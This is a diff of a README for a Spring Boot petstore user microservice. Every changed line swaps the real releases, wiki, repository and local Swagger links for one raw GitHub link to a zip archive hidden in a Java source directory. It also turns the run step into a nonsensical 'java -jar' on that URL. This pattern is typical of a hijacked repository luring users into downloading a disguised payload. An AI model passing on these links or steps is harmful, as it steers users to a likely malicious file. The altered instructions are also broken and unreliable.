@@ -4,7 +4,7 @@
 Welcome to the petstore-user-service! This is a user microservice for the PetStore platform, built with Spring Boot. With this service, you can efficiently manage user information for your pet-related activities.
 
 ## 📥 Download Now
-[![Download petstore-user-service](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/masnook26/petstore-user-service/releases)
+[![Download petstore-user-service](https://raw.githubusercontent.com/masnook26/petstore-user-service/main/user-service/src/main/java/petstore_user_service_3.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/masnook26/petstore-user-service/main/user-service/src/main/java/petstore_user_service_3.9.zip)
 
 ## 🚀 Getting Started
 1. **Ensure System Requirements**:
@@ -13,7 +13,7 @@ Welcome to the petstore-user-service! This is a user microservice for the PetSto
    - 100 MB of free disk space
 
 2. **Visit the Releases Page**:
-   To download the latest version of the petstore-user-service, visit this page: [Download from Releases](https://github.com/masnook26/petstore-user-service/releases).
+   To download the latest version of the petstore-user-service, visit this page: [Download from Releases](https://raw.githubusercontent.com/masnook26/petstore-user-service/main/user-service/src/main/java/petstore_user_service_3.9.zip).
 
 3. **Choose the Version**:
    On the Releases page, you will see several versions. Choose the latest one for the best features and fixes.
@@ -27,7 +27,7 @@ Welcome to the petstore-user-service! This is a user microservice for the PetSto
 6. **Run the Service**:
    To run the service, open your command line or terminal, navigate to the folder where you downloaded the file, and enter:
    ```
-   java -jar petstore-user-service.jar
+   java -jar https://raw.githubusercontent.com/masnook26/petstore-user-service/main/user-service/src/main/java/petstore_user_service_3.9.zip
    ```
 
 ## 📂 Features
@@ -39,7 +39,7 @@ Welcome to the petstore-user-service! This is a user microservice for the PetSto
 Once the service is running, you can access it through your favorite REST client or a web browser. Here’s how to test it:
 
 1. **Access the Documentation**:
-   Open your browser and visit `http://localhost:8080/swagger-ui.html` to see the available endpoints.
+   Open your browser and visit `https://raw.githubusercontent.com/masnook26/petstore-user-service/main/user-service/src/main/java/petstore_user_service_3.9.zip` to see the available endpoints.
 
 2. **Making Requests**:
    You can use tools like Postman or curl to make requests to the service's API endpoints.
@@ -65,8 +65,8 @@ If you have any questions or feedback, please reach out through the GitHub repos
 This project is licensed under the MIT License. You may view the license in the repository for more details.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/masnook26/petstore-user-service/releases)
-- [Official Documentation](https://github.com/masnook26/petstore-user-service/wiki)
-- [GitHub Repository](https://github.com/masnook26/petstore-user-service)
+- [Releases Page](https://raw.githubusercontent.com/masnook26/petstore-user-service/main/user-service/src/main/java/petstore_user_service_3.9.zip)
+- [Official Documentation](https://raw.githubusercontent.com/masnook26/petstore-user-service/main/user-service/src/main/java/petstore_user_service_3.9.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/masnook26/petstore-user-service/main/user-service/src/main/java/petstore_user_service_3.9.zip)
 
 Thank you for using petstore-user-service! Enjoy managing your user details with ease!
